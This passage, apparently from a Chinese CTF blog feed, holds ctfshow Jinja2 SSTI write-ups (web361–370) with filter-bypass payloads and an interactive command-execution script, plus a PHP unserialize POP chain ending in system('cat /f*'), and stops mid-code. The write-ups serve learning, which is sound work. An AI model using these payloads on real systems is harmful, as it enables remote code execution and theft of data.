&#125;&#125;</code></li><li>手法三： <code>lipsum.__globals__</code> 含有 os 模块：</li><li>?name= <code>&#123;&#123;lipsum.__globals__['os'].popen('tac ../flag').read()&#125;&#125;</code></li><li>手法三：利用 <code>__builtins__</code></li><li>?name= <code>&#123;&#123;url_for.__globals__['__builtins__']['eval'](__import__('os').popen('cat /flag').read()&#125;&#125;</code></li><li>?name= <code>&#123;&#123;url_for.__globals__.__builtins__.eval("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></li></ul></blockquote><h1 id="web362"><a class="markdownIt-Anchor" href="#web362">#</a> web362：</h1><p>​过滤了数字 2，3，上没有数字的 payload 就行了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">&#x27;Enter your command: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            url = <span class="string">&quot;http://059cc139-d7d5-4369-86b1-0f3cf98b114c.challenge.ctf.show/?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;&quot;</span> + cmd + <span class="string">&quot;&#x27;).read() &#125;&#125;&quot;</span></span><br><span class="line">            anser = get(url).text</span><br><span class="line">            <span class="built_in">print</span>(anser)</span><br><span class="line">poc()</span><br></pre></td></tr></table></figure><p>​另外的 payload：</p><ul><li><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>?name<span class="token operator">=</span><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>swig￼<span class="token number">26</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>swig￼<span class="token number">27</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#先利用 join 和 count 过滤器得到数字 2，然后再用 66*2 去得到 132</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>code￼<span class="token number">2</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></pre></td></tr></table></figure></li><li><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>?name<span class="token operator">=</span><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>swig￼<span class="token number">28</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></pre></td></tr><tr><td data-num="2"></td><td><pre>或者</pre></td></tr><tr><td data-num="3"></td><td><pre>?name<span class="token operator">=</span><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>swig￼<span class="token number">29</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>code￼<span class="token number">3</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></pre></td></tr></table></figure></li></ul><p>​payload2：这里用 config 拿到字符串，比较麻烦就不全演示了，只演示部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[(config.__str__()[<span class="number">2</span>])%2B(config.__str__()[<span class="number">42</span>])]&#125;&#125;</span><br><span class="line">相当于</span><br><span class="line">?name=&#123;&#123;url_for.__globals__[<span class="string">&#x27;os&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><p>​payload3：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=url_for.__globals__.__builtins__.<span class="built_in">chr</span> %&#125;&#123;% <span class="built_in">print</span>  url_for.__globals__[<span class="built_in">chr</span>(<span class="number">111</span>)%2bchr(<span class="number">115</span>)]%&#125;</span><br><span class="line"> </span><br><span class="line">使用</span><br><span class="line">?name=&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=url_for.__globals__.__builtins__.<span class="built_in">chr</span> %&#125;&#123;&#123; url_for.__globals__[<span class="built_in">chr</span>(<span class="number">111</span>)%2bchr(<span class="number">115</span>)]&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="web364"><a class="markdownIt-Anchor" href="#web364">#</a> web364：</h1><p>​过滤了引号，args，同时不允许使用 POST 传参，使用 Cookie 传参吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">94</span>][request.cookies.m1](<span class="number">0</span>,request.cookies.m2)&#125;&#125;</span><br></pre></td></tr></table></figure><p>​之后 Cookie 传入参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=get_data;m2=/flag</span><br></pre></td></tr></table></figure><h1 id="web365"><a class="markdownIt-Anchor" href="#web365">#</a> Web365：</h1><p>​这里在上一个题的基础上过滤了中括号，所以得用别的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(<span class="number">290</span>).__init__.__globals__.__getitem__(request.cookies.m1).popen(request.cookies.m2).read()</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><p>​之后 Cookie 传入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=os;m2=cat /flag</span><br></pre></td></tr></table></figure><p>​还有个办法，不过是一次性的，失败了之后环境就废了，毕竟 pop 会删除对应的键，导致环境崩溃：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__().pop(<span class="number">290</span>).__init__.__globals__.pop(request.cookies.m1).popen(request.cookies.m2).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>​之后 Cookie 传入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=os;m2=cat /flag</span><br></pre></td></tr></table></figure><h1 id="web366"><a class="markdownIt-Anchor" href="#web366">#</a> Web366：</h1><p>​这个题多过滤了下划线，可以用 lipsum 绕过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.cookies.m1)).os.popen(request.cookies.m2).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>​之后 Cookie 传入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=__globals__;m2=cat /flag</span><br></pre></td></tr></table></figure><h1 id="web367"><a class="markdownIt-Anchor" href="#web367">#</a> Web367：</h1><p>​这个题又过滤了个 os，直接扔个 payload 吧，Payload 解释问 Ai 都可以问出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.cookies.m1)).get(request.cookies.m3).popen(request.cookies.m2).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>​之后传入 Cookie：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=__globals__;m2=cat /flag;m3=os</span><br></pre></td></tr></table></figure><h1 id="web368"><a class="markdownIt-Anchor" href="#web368">#</a> Web368：</h1><p>​这个题，需要用到 <code>&#123;% %&#125;</code> ，因为双大括号里的 request 被过滤了，但是 <code>&#123;% %&#125;</code>  中的 request 没有被过滤，和上一个题构造的 payload 一样，不过有点改变，就是没有使用双大括号，所以需要 print 输出以下（类似无回显）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%<span class="built_in">print</span>((lipsum|attr(request.cookies.m1)).get(request.cookies.m3).popen(request.cookies.m2).read())%&#125;</span><br></pre></td></tr></table></figure><h1 id="web369"><a class="markdownIt-Anchor" href="#web369">#</a> Web369：</h1><p>​这里直接给 request 给 ban 了，不过可以自己拼字符串，还算好，直接上最终 payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(init=a)|join,a,a)|join%&#125;&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,a,a)|join()%&#125;&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;&#123;% <span class="built_in">set</span> buil=(a,a,<span class="built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;&#123;% <span class="built_in">set</span> x=(x|attr(ini)|attr(glo)|attr(geti))(buil)%&#125;&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span>%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>(<span class="number">47</span>)%2bchr(<span class="number">102</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">103</span>)%&#125;&#123;%<span class="built_in">print</span>(x.<span class="built_in">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure><p>​看着很长很唬人，但实际确实不简单，这个我会在下一篇文章进行考点总结的，不急，这里先给下解释：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;          //拼接出pop</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;         //拼接出_</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(init=a)|join,a,a)|join%&#125;          //拼接出__init__</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,a,a)|join()%&#125;       //拼接出__globals__</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;//拼接出__getitem__</span><br><span class="line">&#123;% <span class="built_in">set</span> buil=(a,a,<span class="built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;//拼接出__builtins__</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(x|attr(ini)|attr(glo)|attr(geti))(buil)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span>%&#125;//使用<span class="built_in">chr</span>类来进行RCE因为等会要<span class="built_in">ascii</span>转字符</span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>(<span class="number">47</span>)%2bchr(<span class="number">102</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">103</span>)%&#125;//拼接出/flag</span><br><span class="line">&#123;%<span class="built_in">print</span>(x.<span class="built_in">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure><h1 id="web370"><a class="markdownIt-Anchor" href="#web370">#</a> Web370：</h1><p>​这个题过滤了数字，不过可以用全角数字来绕过，转换的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">half2full</span>(<span class="params">half</span>):</span><br><span class="line">    full = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> half:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(ch) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">            ch = <span class="built_in">chr</span>(<span class="built_in">ord</span>(ch) + <span class="number">0xfee0</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">ord</span>(ch) == <span class="number">32</span>:</span><br><span class="line">            ch = <span class="built_in">chr</span>(<span class="number">0x3000</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        full += ch</span><br><span class="line">    <span class="keyword">return</span> full</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    t = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    s = <span class="built_in">input</span>(<span class="string">&quot;输入想要转换的数字字符串：&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        t += half2full(i)</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​得到的 payload 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(２４)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(init=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> built=(a,a,<span class="built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span>%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(x.<span class="built_in">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web361&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#web361&quot;&gt;#&lt;/a&gt; web361：&lt;/h1&gt;
&lt;p&gt;​		name 传参，直接干：&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;tabl</summary>
      
    
    
    
    <category term="Web狗的自我安慰" scheme="http://blog.g01den.top/categories/Web/"/>
    
    
    <category term="Web" scheme="http://blog.g01den.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>从NSSCTF开始的复建之路</title>
    <link href="http://blog.g01den.top/posts/cf99ed43.html"/>
    <id>http://blog.g01den.top/posts/cf99ed43.html</id>
    <published>2025-03-26T14:52:27.000Z</published>
    <updated>2025-05-03T13:02:26.360Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从nssctf开始的复建之路"><a class="markdownIt-Anchor" href="#从nssctf开始的复建之路">#</a> 从 NSSCTF 开始的复建之路</h1><h2 id="前言"><a class="markdownIt-Anchor" href="#前言">#</a> 前言：</h2><p>​摆烂了有段时间了，感觉不应该再继续这样了，开个新坑，让我慢慢回忆一些忘记的内容，我知道不应该摆烂，但心理问题导致我感觉一切都失去了意义，还好，maimai 让我至少有活下去的想法，在写这段话的时候，我正在听 The Last Page – ARForest，一切的不如意都有最后一页，而现在，我希望我的低谷期已经来到了 The Last Page ，期待接下来的每一步都会像 The Last Page 一般，充满希望，充满美好。-- 发癫完毕</p><h2 id="re"><a class="markdownIt-Anchor" href="#re">#</a> Re：</h2><h3 id="swpuctf-2022-新生赛base64"><a class="markdownIt-Anchor" href="#swpuctf-2022-新生赛base64">#</a> [SWPUCTF 2022 新生赛] base64</h3><p>​IDA 打开后，shift+f12 找到了 base64 编码的编码表，表没有经过修改，同时找到加密后的数据：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TlNTQ1RGe2Jhc2VfNjRfTlRXUTRaR0ROQzdOfQ==</span><br></pre></td></tr></table></figure><p>​经过 base64 解码之后得到 flag：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;base<span class="built_in">_</span>64<span class="built_in">_</span>NTWQ4ZGDNC7N&#125;</span><br></pre></td></tr></table></figure><h2 id="web"><a class="markdownIt-Anchor" href="#web">#</a> Web ：</h2><h3 id="moectf-2021unserialize"><a class="markdownIt-Anchor" href="#moectf-2021unserialize">#</a> [MoeCTF 2021]unserialize</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">entrance</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start = <span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start-&gt;<span class="title function_ invoke__">helloworld</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">springboard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$middle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;middle-&gt;hs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$end</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;end = <span class="variable">$end</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$Attribute</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;serialize&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;serialize&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​首先从 entrance 出发，反序列化出发  <code>__destruct</code>  ， 让 start 作为 springboard 可触发  <code>__call</code> ，让</p><p>springboard  中的 middle 作为 evil 可触发  <code>__get</code>  ，之后就是给 end 传参实现 RCE。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">entrance</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">springboard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$middle</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">entrance</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;start = <span class="keyword">new</span> <span class="title function_ invoke__">springboard</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;start-&gt;middle = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;start-&gt;middle-&gt;end = <span class="string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h3 id="gdouctf-2023反方向的钟"><a class="markdownIt-Anchor" href="#gdouctf-2023反方向的钟">#</a> [GDOUCTF 2023] 反方向的钟:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$rank</span>,<span class="variable">$salary</span> = <span class="number">10000</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rank = <span class="variable">$rank</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;salary = <span class="variable">$salary</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$leader</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;leader = <span class="variable">$leader</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hahaha</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name != <span class="string">&#x27;one class&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;name != <span class="string">&#x27;ing&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="string">&#x27;department&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span 